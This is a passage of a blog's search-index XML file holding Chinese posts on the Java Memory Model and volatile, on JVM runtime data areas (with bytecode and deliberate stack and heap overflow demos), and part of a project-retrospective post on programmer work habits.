<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Java多线程内存模型]]></title>
    <url>%2F14cb0399%2F</url>
    <content type="text"><![CDATA[Java内存模型是多线程开发必须掌握的一个知识点。如果不想出现“知识不够，玄学来凑”的情况，想要在程序出现诡异问题的时候能够根据知识和经验快速定位并处理问题，就需要彻底搞懂Java内存模型。必须要知道什么是内存模型，为什么需要内存模型，以及引入内存模型能解决什么问题，在Java中是如何定义内存模型的。 Java内存模型（Java Memory Model）简称JMM，在JSR-133规范中定义了Java内存模型与线程的规范 基础知识什么是内存模型 内存模型是为了保证多核心处理器的各级缓存与主内存数据的一致性而引入的数据操作模型。 在硬件层面：为了达到更高的性能引入了多核心处理器，每个处理器核心都有自己的高速缓存，并且每个核心都共享同一个主内存，从而引发了高速缓存与主内存的缓存一致性问题。 为了解决缓存一致性问题，需要各个处理器访问数据时都遵循“缓存一致性协议”。处理器在读写数据时需要根据协议进行操作，常见的缓存一致性协议有：MSI、MESI、MOSI、Synapse等。内存模型可以定义为：在特定的操作协议下，对特定的内存进行读写访问的抽象模型。不同的硬件有不同的内存模型，为了屏蔽不同平台硬件的差异，Java虚拟机也定义了自己的内存模型。 Java内存模型的定义 Java内存模型屏蔽了不同平台硬件的差异，定义了变量的底层访问规则细节。 为什么需要Java内存模型？不同的CPU处理器有不同的内存屏障实现，Java虚拟机提供了内存屏障类似的实现，保证了缓存一致性。Java内存模型在语言层面屏蔽了底层硬件的差异，降低开发者多编写多线程程序的难度。下图为Java多线程开发模型中的内存关系简化：每个线程共享同一个主内存，且每个线程都有自己的工作内存，此处的工作内存可以对应理解为CPU的高速缓存。 每个线程都不能直接操作主内存，只能修改线程自己的工作内存，再同步回主内存。 Java内存模型规定了如下5条规范： Java内存模型规定所有的变量都存储在主内存中。 每条线程都有自己的工作内存 线程的工作内存中保存了该线程中使用到的变量的主内存副本拷贝 线程对变量的读写都必须在工作内存中进行，不能直接读写主内存。 线程间的变量传递必须通过主内存，不能直接访问其他线程的工作内存。 主内存与工作内存的交互协议Java内存模型定义了8种操作来完成。 作用于主内存：lock 锁定：把变量标识为锁定状态，锁定后线程独占，其他线程无法访问。unlock 解锁：解锁变量的锁定状态，解锁后其他线程才能访问。read读取：把主内存的变量传输到一个线程的工作内存中，待load操作使用。write写入： 把store操作从工作内存中得到的变量存储到主内存中。 作用于工作内存：load加载：把read操作的变量加载到线程的工作内存的变量副本中。use 使用： 把工作内存中的变量传递给执行引擎。assign 赋值：把执行引擎的变量赋值给工作内存中的变量。store 存储：把工作内存中的变量传递到主内存中，待write操作使用。 8种操作规则 read和load、 store和write 必须成对出现。不允许出现read完不load的情况，store完不write的情况。 assign完成必须同步回主内存，不允许丢弃。 不允许没有assign操作的数据从工作内存同步回主内存。 变量必须在主内存中诞生，在use和store之前必须经过assign和load操作。 一个线程可以对一个变量执行多次lock，执行多次lock后需要执行相同次数unlock才能释放锁，在锁定期间其他线程不允许lock。 如果一个变量被lock，将会清空工作内存中此变量副本的值，执行引擎执行前需要重新执行load或assign完成初始化变量值的操作。 如果变量没有lock，不允许执行unlock操作。 对变量执行lock之前，必须把此变量同步回主内存中，执行store和write操作。 多线程共享变量的不可见性不使用volatile修饰的多线程访问共享变量的情况123456789101112131415161718192021222324252627282930313233343536373839/** * 多线程共享变量不可见测试 * @author 蓝士钦 */public class MultiThreadSharedVarTest &#123; public static boolean initDataStatus = false; public static void main(String[] args) throws InterruptedException &#123; Thread readThread = new Thread(new Runnable() &#123; @Override public void run() &#123; System.out.println("[readThread]: waiting data..."); while (!initDataStatus)&#123; // do something &#125; System.out.println("[readThread]: data read success done."); &#125; &#125;); readThread.start(); TimeUnit.SECONDS.sleep(2); Thread initThread = new Thread(new Runnable() &#123; @Override public void run() &#123; System.out.println("[initThread]: init data"); initData(); System.out.println("[initThread]: init done."); &#125; &#125;); initThread.start(); &#125; public static void initData()&#123; initDataStatus = true; &#125;&#125; 不使用volatile的执行结果：123[readThread]: waiting data...[initThread]: init data[initThread]: init done. 针对共享变量，两个线程的工作流程简化如下： 在主内存中定义了共享变量 initDataStatus = false 在readThread线程中读取共享变量initDataStatus并拷贝到自己的工作内存中，得到initDataStatus变量副本, CPU读取副本变量进入while循环后空转。 在initThread线程中读取共享变量initDataStatus并拷贝到自己的工作内存中，并将工作内存中的initDataStatus变量副本设置为true。 图中省略了initThread将工作内存同步写回主内存的操作，同步写回后readThread线程依旧无法感知，会继续使用工作内存中的值。两个线程在各自的工作内存中读写initDataStatus变量副本。此时readThread永远不会读取到initThread对变量修改后的值，readThread线程将会一直处于while循环中 volatile的变量可见性 java内存模型提供了volatile关键字来保证变量的可见性和有序性 将第7行代码加上volatile关键字修饰 initDataStatus 变量。123// ... public static volatile boolean initDataStatus = false;// 略... 使用volatile的执行结果：1234[readThread]: waiting data...[initThread]: init data[initThread]: init done.[readThread]: data read success done. 使用volatile关键字可以开启CPU嗅探机制，实现缓存一致性协议的功能。CPU核心会监听BUS总线上有关volatile修饰的变量的值变动。执行过程如下： 通过read和load指令将主内存中的initDataStatus = false拷贝到readThread线程的工作内存中。 readThread线程使用use指令，将工作内存中的initDataStatus变量副本交给执行引擎执行指令!initDataStatus,进入while空转。 通过read和load指令将主内存中的initDataStatus = false拷贝到initThread线程的工作内存中。 initThread线程使用use指令，将工作内存中的initDataStatus变量副本交给执行引擎执行指令initDataStatus=true,通过assign指令将initDataStatus=true赋值给工作内存。 volatile变量变化后立即通过 store和write指令将工作内存中的initDataStatus=true写回主内存。 第五步写回主内存时经过BUS总线，CPU为volatile修饰的变量开启了嗅探机制。initThread修改变量后经过总线时将会被Core 0核心监听到，Core 0核心中的readThread会将工作内存中的initDataStatus变量失效，重新从主内存中加载。CPU嗅探机制会监听volatile修饰的变量变化，使工作内存中的变量失效，重新从主内存读取。 指令重排问题 在不影响单线程程序执行结果的前提下，计算机为了最大限度发挥机器的性能，会对上下文无关的指令进行重排序优化。 编译器和CPU都有可能会对程序进行指令重排优化，重排序会遵循as-if-serial与happens-before原则。 不能重排的程序：123456789public class WillNotSortFrom &#123; static int x = 0; public static void main(String[] args) &#123; x = 5; System.out.println("x="+x); &#125;&#125; 程序输出结果：1x=5 上面的代码不允许进行指令重排，假设第6行和第7行代码重排了顺序，先执行输出语句System.out.println(&quot;x=&quot;+x)，将会打印x=0，再执行赋值操作x = 5。这将会改变单线程内执行结果的一致性。 在单个线程内，第7行的变量x，依赖第6行对x的赋值操作，上下文相关的指令不会进行重排 对于多线程间的变量操作，就无法保证上下文无关的指令进行重排序了，代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142/** * 指令重排测试 * @author 蓝士钦 */public class ReorderTest &#123; static int x = 0; static int y = 0; static int a = 0; static int b = 0; public static void main(String[] args) throws InterruptedException &#123; Set&lt;String&gt; resultSet = new HashSet&lt;&gt;(); for (int i=0; i&lt; 100000000; i++)&#123; x = 0; y = 0; a = 0; b = 0; Thread oneThread = new Thread(() -&gt; &#123; a = 1; x = b; &#125;); Thread twoThread = new Thread(() -&gt; &#123; b = 1; y = a; &#125;); oneThread.start(); twoThread.start(); oneThread.join(); twoThread.join(); resultSet.add("x="+x+",y="+y+""); System.out.println(resultSet); &#125; &#125;&#125; 线程one中的代码没有上下文依赖关系，线程tow中的代码也没有上下文依赖关系。但是线程one和线程two有互相依赖的共享变量，编译器和cpu无法区分多线程间变量的依赖顺序为了验证指令发生重排，循环了一亿次，执行一段时间后，程序输出结果：1[x=0,y=1, x=1,y=1, x=0,y=0, x=1,y=0] 意料之中的结果： one线程先执行完毕，在执行tow线程，x=0,y=1。 two线程先执行完毕，在执行one线程，x=1,y=0。 one线程执行a=1后被中断，再执行two线程，直到tow线程执行完毕，在恢复one线程执行，x=1,y=1。 意料之外的结果： x=0,y=0是意料之外的结果。因为发生了指令重排，指令重排可能发生在两个线程中。假设执行one线程发生了指令重排，第23行和第24行代码，x=b在a=1对换了位置。one线程执行x=b后被中断，接着执行two的线程直到执行完成，然后恢复one线程执行，此时就发生了x=0,y=0的情况。为了避免指令重排，java提供了volatile关键字来开启内存屏障，防止指令重排。将上面的变量声明加上volatile即可。1234static volatile int x = 0;static volatile int y = 0;static volatile int a = 0;static volatile int b = 0;volatile关键字提供给开发人员手动关闭指令重排的能力。 内存屏障防止指令重排 硬件层面很难知道软件层面前后的依赖关系，所以CPU层面提供了内存屏障，使软件可以决定在适当的地方插入内存屏障来解决指令重排序问题。 CPU层面的内存屏障 写屏障（Store Memory Barrier）：告诉处理器在写屏障之前的指令数据必须从存储缓存（store buffer）中写回主内存，写屏障之前的操作对写屏障之后必须可见。 读屏障（Load Memory Barrier）：配合写屏障，使得写屏障之前的内存更新，对于读屏障之后的操作可见。 全屏障（Full Memory Barrier）：全屏障前的内存读写操作提交到内存之后，在进行全屏障之后的内存读写操作。 JVM层面的内存屏障 Java提供了volatile关键字来使得JVM层面能够插入内存屏障功能。 JMM提供了4种内存屏障： LoadLoad Barrier，示例Load1;LoadLoad;Load2，确保Load1的指令先于Load2及后续指令的加载。 StoreStore Barrier，示例Store1;StoreStore;Store2，确保Store1的数据先于Store2的数据同步到主内存。 LoadStore Barrier，示例Load1;LoadStore;Store2，确保Load1的数据加载先于Store2及后续的所有指令同步到主内存。 StoreLoad Barrier，示例Store1;StoreLoad;Load2，确保Store1的数据全部同步到主内存之后，先于Load2的数据加载操作。 volatile关键字修饰的变量，插入内存屏障策略： 在每个volatile变量写操作前，加入StoreStore Barrier。 在每个volatile变量写操作后，加入StoreLoad Barrier。 在每个volatile变量读操作前，加入LoadLoad Barrier。 在每个volatile变量读操作后，加入LoadStore Barrier。 happens-before规则happens-before规则表达多线程之间的内存可见性，前一个操作对后一个操作是可见的。如果一个操作要让另外一个操作可见，就必须满足happens-before关系，无论两个操作是在同一个线程中还是不同线程中。详细规则此处不展开。 volatile底层实现原理 JVM底层通过lock汇编前缀指令，实现内存屏障功能。 可以通过运行时指定虚拟机参数，打印机器平台对应的汇编指令，运行时参数如下：1-server -Xcomp -XX:+UnlockDiagnosticVMOptions -XX:+PrintAssembly -XX:CompileCommand=compileonly,*MultiThreadSharedVarTest.initData -XX:+PrintAssembly参数打印汇编指令代码需要相关的动态库支持，JDK8中默认不启用汇编打印，需要下载对应的支持库。MacOS平台的库文件为：hsdis-amd64.dylib， 对应平台的库文件需要自行下载，放到对应目录，此处不展开记录。运行程序后，输出的汇编指令如下：12345678910111213141516171819202122232425262728293031323334353637CompilerOracle: compileonly *MultiThreadSharedVarTest.initDataJava HotSpot(TM) 64-Bit Server VM warning: PrintAssembly is enabled; turning on DebugNonSafepoints to gain additional output[readThread]: waiting data...[initThread]: init dataLoaded disassembler from /Library/Java/JavaVirtualMachines/jdk1.8.0_202.jdk/Contents/Home/jre/lib/server/hsdis-amd64.dylibDecoding compiled method 0x00000001094833d0:Code:[Disassembling for mach='i386:x86-64'][Entry Point][Verified Entry Point][Constants] # &#123;method&#125; &#123;0x0000000108627c48&#125; 'initData' '()V' in 'com/lanshiqin/jmm/MultiThreadSharedVarTest' # [sp+0x40] (sp of caller) 0x0000000109483520: mov %eax,-0x14000(%rsp) 0x0000000109483527: push %rbp 0x0000000109483528: sub $0x30,%rsp 0x000000010948352c: movabs $0x108628b38,%rsi ; &#123;metadata(method data for &#123;method&#125; &#123;0x0000000108627c48&#125; 'initData' '()V' in 'com/lanshiqin/jmm/MultiThreadSharedVarTest')&#125; 0x0000000109483536: mov 0xdc(%rsi),%edi 0x000000010948353c: add $0x8,%edi 0x000000010948353f: mov %edi,0xdc(%rsi) 0x0000000109483545: movabs $0x108627c48,%rsi ; &#123;metadata(&#123;method&#125; &#123;0x0000000108627c48&#125; 'initData' '()V' in 'com/lanshiqin/jmm/MultiThreadSharedVarTest')&#125; 0x000000010948354f: and $0x0,%edi 0x0000000109483552: cmp $0x0,%edi 0x0000000109483555: je 0x000000010948357f ;*iconst_1 ; - com.lanshiqin.jmm.MultiThreadSharedVarTest::initData@0 (line 42) 0x000000010948355b: movabs $0x7956a1de0,%rsi ; &#123;oop(a 'java/lang/Class' = 'com/lanshiqin/jmm/MultiThreadSharedVarTest')&#125; 0x0000000109483565: mov $0x1,%edi 0x000000010948356a: mov %dil,0x68(%rsi) 0x000000010948356e: lock addl $0x0,(%rsp) ;*putstatic initDataStatus ; - com.lanshiqin.jmm.MultiThreadSharedVarTest::initData@1 (line 42) 0x0000000109483573: add $0x30,%rsp 0x0000000109483577: pop %rbp 0x0000000109483578: test %eax,-0x395747e(%rip) # 0x0000000105b2c100 ; &#123;poll_return&#125; // 略... 从汇编指令中可以看到 lock指令，对应initData方法的initDataStatus变量，lock指令实现了和内存屏障一样的功能120x000000010948356e: lock addl $0x0,(%rsp) ;*putstatic initDataStatus ; - com.lanshiqin.jmm.MultiThreadSharedVarTest::initData@1 (line 42) volatile底层通过汇编lock指令，实现硬件级别的锁。不同硬件平台的汇编指令有所不同，从JVM虚拟机的C/C++源码实现中可以找到不同平台的lock指令实现，JVM为Java程序员屏蔽了底层硬件差异。 为了解决缓存一致性问题，CPU层面提供了两种锁机制：总线锁和缓存锁。 总线锁处理器其中一个核心对共享内存进行操作的时候，在总线上发出一个LOCK信号，使得其他处理器无法通过总线来访问共享内存中的数据，锁定期间其他处理器无法访问其他内存地址的数据。代价太大，需要降低锁的粒度，引入了缓存锁。 缓存锁缓存锁是基于缓存一致性协议实现的，一个处理器的缓存写回会导致其他处理器的缓存无效。不同的处理器实现的缓存一致性协议不同。 缓存一致性协议 MESI MESI是一种比较常用的缓存一致性协议，MESI表示缓存行的四种状态。 M(Modify) 表示共享数据只缓存在当前 CPU 缓存中，并且是被修改状态，也就是缓存的数据和主内存中的数据不一致 E(Exclusive) 表示缓存的独占状态，数据只缓存在当前CPU缓存中，并且没有被修改 S(Shared) 表示数据可能被多个 CPU 缓存，并且各个缓存中的数据和主内存数据一致 I(Invalid) 表示缓存已经失效在 MESI 协议中，每个缓存的缓存控制器不仅知道自己的读写操作，而且也监听(snoop)其它CPU的读写操作。对于 MESI 协议，从 CPU 读写角度来说会遵循以下原则：CPU读操作：缓存处于 M、E、S 状态都可以被读取，I 状态CPU 只能从主存中读取数据CPU写操作：缓存处于 M、E 状态才可以被写。对于S状态的写，需要将其他CPU中缓存行置为无效才行。 总结 并发编程三大特性：可见性、有序性、原子性。 volatile只保证了可见性和有序性，原子性需要借助原子类操作或者使用synchronized这样的锁机制来保证。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Java虚拟机运行时数据区]]></title>
    <url>%2F4cb4c29a%2F</url>
    <content type="text"><![CDATA[Java虚拟机有三块组成部分，分别是：类装载子系统、运行时数据区、字节码执行引擎。运行时数据区是Java虚拟机内部的一个运行时内存，是性能调优的重点区域。身为Java工程师，必须要了解底层原理，才能从最根本上让机器发挥出应有的性能。 本章分析的是JDK8的JVM运行时数据区，有关JVM数据区的文档可到Oracle官网进行查阅https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-2.html#jvms-2.5 概念部分Java虚拟机定义了在程序执行期间使用的各种运行时数据区域。图中黄色区域是线程共享的，在虚拟机启动时创建，随着虚拟机的停止而销毁。图中绿色区域是线程私有的，随着线程的启动被分配，随着线程的停止而销毁。Java虚拟机运行时数据区主要分为5个部分：程序计数器、Java虚拟机栈、堆、方法区、本地方法栈。 程序计数器（Program Counter Register）线程私有区域，是一块较小的内存空间，用来记录当前线程所执行的字节码行号。每个线程都有自己的程序计数器，各个线程的程序计数器互不影响。如果线程正在执行的是一个Java方法，则记录的是字节码的指令地址，如果执行的是本地方法，则计数器的值为空。此区域不会出现OOM的情况。 Java虚拟机栈（Java Virtual Machine Stack）线程私有区域，生命周期与线程相同。Java虚拟机栈描述的是Java方法执行时的内存模型，每个方法在执行时会在虚拟机栈中创建一个栈帧，进行入栈操作。栈帧内部包含4个区域：本地变量表、操作数栈、动态链接、方法出口。方法执行完毕会将栈帧出栈。在Java虚拟机规范中，此区域可能出现 StackOverflowError和 OutOfMemoryError。比如在一个线程中方法调用的深度超出了Java虚拟机栈的大小，就无法为新的方法调用分配栈帧，抛出 StackOverflowError。在多线程中为方法创建栈帧，每个线程为方法创建的栈大小总和超出了Java虚拟机栈的大小，无法为新的方法调用分配内存空间，就会抛出OutOfMemoryError。 堆（Heap）线程共享区域，在虚拟机启动时创建，用来存储对象实例，是JVM垃圾收集器的主要区域。垃圾收集器为了更加高效的进行垃圾回收，采用了各种不同的垃圾回收算法，将堆内存进行划分。在JDK1.8中，堆内存可以细分为：Eden区、Survivor区（From Survivor，To Survivor）、Old区。堆区在逻辑上是连续的内存区域，不要求物理内存连续。堆大小可以固定也设置成动态，可以通过JVM运行参数 -Xmx 和 -Xms 指定堆大小。如果堆中的内存无法满足分配要求将会抛出 OutOfMemoryError。关于垃圾收集策略此处不展开分析，后面会专门写关于垃圾收集的文章。 方法区（Method Area）线程共享区域，在虚拟机启动时创建，用来存储类信息、常量、静态变量和及时编译后的代码等数据。可以选择不进行垃圾收集。在JDK7中使用永久代来实现方法区，在JDK8中废弃了永久代采用Metaspace（元空间）来进行代替。元空间在本地内存中。 在方法区中还包含了一个 运行时常量池（Runtime Constant Pool），用来存放各种字面量和符号引用，这些字面量不一定是在编译期产生，还可以是程序动态生成的，比如通过 String类的intern方法。如果常量池中的内存无法满足分配要求，将会抛出 OutOfMemoryError。 本地方法栈（Native Method Stacks）与Java虚拟机方法栈的作用类似，区别在于本地方法栈服务于Native方法，在Java中调用的Native方法都将由本地方法栈为方法分配内存，Java虚拟机并不要求本地方法栈中使用的语言和数据结构，在 HotSpot虚拟机中本地方法栈和Java虚拟机方法栈合二为一。 这个区域同样可能发生StackOverflowError和OutOfMemoryError。 案例分析一个方法的执行过程 通过一个方法的执行过程，分析Java虚拟机栈内部工作流程 编写如下代码，在一个Demo类中，包含一个main方法和一个compute方法123456789101112131415public class Demo &#123; public int compute() &#123; int a = 1; int b = 2; int c = a + b; return c * 100; &#125; public static void main(String[] args) &#123; Demo demo = new Demo(); int result = demo.compute(); System.out.println("result="+result); &#125;&#125; 使用javac将代码编译成java字节码文件Demo.class使用 vim -b Demo.class 打开文件，再使用 :%!xxd 以16进制查看文件，得到如下字节码指令12345678900000000: cafe babe 0000 0034 0030 0a00 0d00 1807 .......4.0......00000010: 0019 0a00 0200 180a 0002 001a 0900 1b00 ................00000020: 1c07 001d 0a00 0600 1808 001e 0a00 0600 ................00000030: 1f0a 0006 0020 0a00 0600 210a 0022 0023 ..... ....!..&quot;.#00000040: 0700 2401 0006 3c69 6e69 743e 0100 0328 ..$...&lt;init&gt;...(00000050: 2956 0100 0443 6f64 6501 000f 4c69 6e65 )V...Code...Line00000060: 4e75 6d62 6572 5461 626c 6501 0007 636f NumberTable...co00000070: 6d70 7574 6501 0003 2829 4901 0004 6d61 mpute...()I...ma... 这些字节码指令能够被JVM虚拟机执行，每个指令字符都有对应的解释，可以通过查阅Oracle官方的虚拟机字节码指令表进行对照。本章不展开分析字节码，后续会写对应的文章分析字节码。每个字节码指令都有对应的助记符，为了使人类更加易读，可以使用javap命令，将Demo.class 反汇编成等效的虚拟机指令助记符。1javap -c Demo.class &gt; Demo.txt 1234567891011121314151617181920212223242526272829303132333435363738394041424344Compiled from &quot;Demo.java&quot;public class com.lanshiqin.Demo &#123; public com.lanshiqin.Demo(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V 4: return public int compute(); Code: 0: iconst_1 1: istore_1 2: iconst_2 3: istore_2 4: iload_1 5: iload_2 6: iadd 7: istore_3 8: iload_3 9: bipush 100 11: imul 12: ireturn public static void main(java.lang.String[]); Code: 0: new #2 // class com/lanshiqin/Demo 3: dup 4: invokespecial #3 // Method &quot;&lt;init&gt;&quot;:()V 7: astore_1 8: aload_1 9: invokevirtual #4 // Method compute:()I 12: istore_2 13: getstatic #5 // Field java/lang/System.out:Ljava/io/PrintStream; 16: new #6 // class java/lang/StringBuilder 19: dup 20: invokespecial #7 // Method java/lang/StringBuilder.&quot;&lt;init&gt;&quot;:()V 23: ldc #8 // String result= 25: invokevirtual #9 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 28: iload_2 29: invokevirtual #10 // Method java/lang/StringBuilder.append:(I)Ljava/lang/StringBuilder; 32: invokevirtual #11 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 35: invokevirtual #12 // Method java/io/PrintStream.println:(Ljava/lang/String;)V 38: return&#125; 每个方法在执行时，都会创建一个栈帧，该程序中有main方法和compute方法，在Java虚拟机中对应入下图 字节码文件Demo.class被类装载子系统加载到JVM运行时数据区，做了一系列操作，这些操作此处不展开分析。首先执行的是main方法，Java虚拟机栈对main方法进行入栈操作。main方法中调用了compute方法，对compute进行入栈。此处对compute方法的源代码和对应的字节码助记符详细的分析一下 123456public int compute() &#123; int a = 1; int b = 2; int c = a + b; return c * 100;&#125; 为了方便阅读，查阅了虚拟机字节码指令表，将对应助记符的含义注释在右侧1234567891011121314public int compute(); Code: 0: iconst_1 // 将int型1推送至栈顶 1: istore_1 // 将栈顶int型数值存入第二个本地变量 2: iconst_2 // 将int型2推送至栈顶 3: istore_2 // 将栈顶int型数值存入第三个本地变量 4: iload_1 // 将第二个int型本地变量推送至栈顶 5: iload_2 // 将第三个int型本地变量推送至栈顶 6: iadd // 将栈顶两个int型数值相加并将结果压入栈顶 7: istore_3 // 将栈顶int型数值存入第四个本地变量 8: iload_3 // 将第四个int型本地变量推送至栈顶 9: bipush 100 // 将单字节的常量值100 推送至栈顶 11: imul // 将栈顶两个int型数值相乘并将结果压入栈顶 12: ireturn // 从当前方法返回int 可以看出字节码助记符还是很容易理解的，Code：底下每一行代表一个指令，指令前的数字可以当作指令行号来理解，程序计数器利用行号来记录当前执行到了哪一行。 为了便于理解，制作了执行过程的动画： 在compute方法被调用时，会创建computer的栈帧入栈到Java虚拟机栈中，此处省略方法入栈的演示。ireturn指令，会返回当前操作数栈上的值300，方法执行完成后compute栈帧会出栈，此处省略方法出栈的演示。 将java源代码编译成class字节码后，就可以确定本地变量表的空间大小，compute栈帧中会创建对应大小的固定内存空间。有关虚拟机栈的详细内容此处不展开讨论，后续会有专门的文章进行分析。 StackOverflowError如果方法的调用深度超过Java虚拟机栈的大小，就会发生StackOverflowError。比如一个方法递归的调用自身，没有退出条件： 123456789101112131415161718192021222324252627package com.lanshiqin.jvm;/** * HotSpot Java 虚拟机栈和本地方法栈溢出示例 * StackOverflowError * VM Args：-Xss160k * @author 蓝士钦 */public class StackOF &#123; private int stackLength = 1; public void stackLeak()&#123; stackLength ++; stackLeak(); &#125; public static void main(String[] args) &#123; StackOF stackOF = new StackOF(); try &#123; stackOF.stackLeak(); &#125;catch (Throwable e)&#123; System.out.println("stack length:" + stackOF.stackLength); throw e; &#125; &#125;&#125; 错误信息如下：123456789stack length:773Exception in thread &quot;main&quot; java.lang.StackOverflowError at com.lanshiqin.jvm.StackOF.stackLeak(StackOF.java:14) at com.lanshiqin.jvm.StackOF.stackLeak(StackOF.java:15) at com.lanshiqin.jvm.StackOF.stackLeak(StackOF.java:15) at com.lanshiqin.jvm.StackOF.stackLeak(StackOF.java:15)...... // 省略at com.lanshiqin.jvm.StackOF.main(StackOF.java:21) 可以通过-Xss参数指定每个线程运行时的栈大小，栈越大能容纳的方法调用深度就越大。 OutOfMemoryError如果为每个线程分配过大的方法栈帧，则可能导致OOM，每个方法都占用很大的空间，在多线程执行时就会有很多个方法栈帧，Java虚拟机栈无法为新的方法分配内存空间，就会出现OOM。 123456789101112131415161718192021222324252627282930313233package com.lanshiqin.jvm;/** * Java 虚拟机栈和本地方法栈 多线程内存溢出示例 * OutOfMemoryError,栈帧越大，越容易发生OOM * VM Args：-Xss100m * @author 蓝士钦 */public class JavaVMStackOOM &#123; private void dontStop()&#123; while (true)&#123; // 让方法不被销毁 &#125; &#125; public void stackLeakByThread()&#123; while (true)&#123; Thread thread = new Thread(new Runnable() &#123; @Override public void run() &#123; dontStop(); &#125; &#125;); thread.start(); &#125; &#125; public static void main(String[] args) &#123; JavaVMStackOOM javaVMStackOOM = new JavaVMStackOOM(); javaVMStackOOM.stackLeakByThread(); &#125;&#125; 这个程序会创建无数个线程，可能会让操作系统假死，需要做好备份。运行一段时间后，报错信息如下：123456Exception in thread &quot;main&quot; java.lang.OutOfMemoryError: unable to create new native thread at java.lang.Thread.start0(Native Method) at java.lang.Thread.start(Thread.java:717) at com.lanshiqin.jvm.JavaVMStackOOM.stackLeakByThread(JavaVMStackOOM.java:25) at com.lanshiqin.jvm.JavaVMStackOOM.main(JavaVMStackOOM.java:31)Java HotSpot(TM) 64-Bit Server VM warning: Exception java.lang.OutOfMemoryError occurred dispatching signal SIGINT to handler- the VM may need to be forcibly terminated 大多数情况下，OOM 更多的是发生在堆内存分配，可以通过JVM参数 -Xms指定最小堆内存空间，-Xmx最大堆内存空间，当堆无法为新对象分配内存时，抛出OOM。 1234567891011121314151617181920212223package com.lanshiqin.jvm;import java.util.ArrayList;import java.util.List;/** * Java堆溢出示例 * OutOfMemoryError * VM Args：-Xms20m -Xmx20m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=./java_heap_dump.hprof * * @author 蓝士钦 */public class HeapOOM &#123; static class OOMObject &#123; &#125; public static void main(String[] args) &#123; List&lt;OOMObject&gt; list = new ArrayList&lt;&gt;(); while (true) &#123; list.add(new OOMObject()); &#125; &#125;&#125; 错误信息如下：1234567891011java.lang.OutOfMemoryError: Java heap spaceDumping heap to ./java_heap_dump.hprof ...Unable to create ./java_heap_dump.hprof: File existsException in thread &quot;main&quot; java.lang.OutOfMemoryError: Java heap space at java.util.Arrays.copyOf(Arrays.java:3210) at java.util.Arrays.copyOf(Arrays.java:3181) at java.util.ArrayList.grow(ArrayList.java:265) at java.util.ArrayList.ensureExplicitCapacity(ArrayList.java:239) at java.util.ArrayList.ensureCapacityInternal(ArrayList.java:231) at java.util.ArrayList.add(ArrayList.java:462) at com.lanshiqin.jvm.HeapOOM.main(HeapOOM.java:20) 本章对JVM运行时数据区做简单的概念分析，后续会更加底层的分析运行时的每个内存区域，转载请注明出处。]]></content>
  </entry>
  <entry>
    <title><![CDATA[10x程序员工作法总结]]></title>
    <url>%2F8e86c433%2F</url>
    <content type="text"><![CDATA[2020年6月18日星期四，至今最晚的一次下班打卡时间，次日凌晨1点44分。因为项目上线不顺利，我和其他小伙伴们一起留下来渡过了一次难忘的上线经历。在这个项目中遇到了很多坑，也埋下了很多坑。后来在极客时间上学习了郑烨老师的《10X程序员工作法》之后很有感触，如果早点看到这篇工作法，也许就不会有这么多坑了，项目也不会这么曲折。在此做一下总结。 情景描述 先来回顾一下这个项目，项目不便透露细节，所以进行简单描述 一句话概括：这是一个动作很大且很复杂的工程，需要打通两个不同体系的系统，将系统进行整合。 工作内容：将用户体系进行合并，统一登陆机制、鉴权机制。两个系统底下的子业务模块要能够无缝衔接。 复盘 为什么上线这么不顺利 倒推到需求和开发阶段 需求不够明确 需求粒度太大，看不到需求的终点，无法明确的定义怎样才算完成需求，缺少验收标准。 需求不仅来自产品经理，也来自一些其他技术需求，假设有“迁移角色权限”这个需求，在研发的思维里就是写个SQL或者自动化程序将角色的权限从旧库表迁移到新库表。但是很难界定完成的标准。迁移完系统A的角色权限就算迁移完了吗？系统B的角色权限要迁移吗？系统B是另外B部门负责的，所以他们负责迁移系统B的角色权限。B部门知道迁移的规则吗，要不要告诉他规则和注意事项，新旧表的字段结构如何对应，需要协助B部门吗，如何协助B部门？站在老板的角度看，“迁移角色权限”这个需求一定是A系统和B系统都迁移整合完才算完成，A系统迁移完只是阶段性的成果。站在研发A的一亩三分地，自然认为这个需求完成了，把需求状态改为done，这时候又有新的需求分配过来，研发A就去做新需求了，过段时间研发A已经记不清到底任务完成没，只知道“迁移角色权限”他是done的状态，印象中也是完成的。至于B部门的迁移任务在研发A里自动被忽略了。 任务分解不到位 接到需求后马上着手开始工作，在工作被中途打断后，很难继续上次被中断的地方，造成关键步骤的遗漏。 还是以“迁移角色权限”这个需求为例，研发A看到这个需求马上就想着开始干吧，然后马上就开始写代码了。因为没有做任务分解，常常会因为任务的中断而不知道自己做到哪一步了。在日常开发中经常会有优先级更高的需求或者排查其他问题导致任务被中断，等后面回过头来时往往记不清自己做到哪一步了。如果研发A做了“任务分解”，在任务分解过程中发现这个任务还需要B部门协助，就应该把B部门任务也列出来，列出具体步骤，并且向上沟通反馈到产品经理，产品经理知道这个需求应该要拆分成两个需求，把B部门的任务分配给B部门。 沟通不到位 每个人所理解的世界是不一样的，在口头表述的消息传递过程中会出现信息丢失，理解偏差的问题。 在跨部门的项目中团队间沟通反馈不够及时。中途存在多个产品经理共同提需求的情况，需求需要跨部门的研发配合，存在沟通问题。其实有些需求应该是对应的产品给自己的研发团队提需求。在跨部门合作中资源协调时沟通反馈往往不够及时，是很大的一个问题。 在大项目进行中还时不时的加进来一些其他需求，而这些需求往往会干扰正在做的最重要的事。有些需求其实是可以和产品沟通，甚至和老板沟通，而可以延后做甚至不做的需求。在不同上下文沟通中容易出的问题，研发人员往往会把自己局限在“程序员”这个角色中，在上下级沟通的时候往往只看到自己的一亩三分地。很难从更高的视角甚至站在全局去考虑问题。 系统构建问题 没有做到每日构建，代码风格检查。构建失败问题拖延项目进度。 